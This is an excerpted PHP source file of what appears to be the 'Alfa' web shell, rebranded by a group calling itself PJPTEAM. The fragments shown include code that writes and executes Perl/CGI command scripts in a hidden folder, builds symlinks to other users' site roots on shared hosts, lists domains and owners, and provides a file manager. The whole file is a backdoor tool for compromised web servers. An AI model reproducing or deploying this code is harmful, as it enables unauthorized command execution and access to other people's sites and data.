...
/*
	Author: 	PJPTEAM
	Telegram: 	https://telegram.me/pjpteam
	YouTube: 	https://youtube.com/pjpteam
	Gmail:		pjpteam@gmail.com
	Date:		Monday, September 14, 2021
*/
...
define("__SEO_PJPTEAM_FOLDER__", "SEO_PJPTEAM");
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.pinimg.com/originals/ec/a8/9b/eca89b1c29d38536a66fce96aae5f33c.jpg" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __SEO_PJPTEAM_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.pinimg.com/originals/ec/a8/9b/eca89b1c29d38536a66fce96aae5f33c.jpg" /></td>
</tr>
<tr>
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __SEO_PJPTEAM_FOLDER__);
	}
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __SEO_PJPTEAM_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__SEO_PJPTEAM_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__SEO_PJPTEAM_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__SEO_PJPTEAM_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__SEO_PJPTEAM_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#EAFF00\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#EAFF00\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#EAFF00\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
...
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#279B59>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
...
return('<iframe src="'.__SEO_PJPTEAM_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
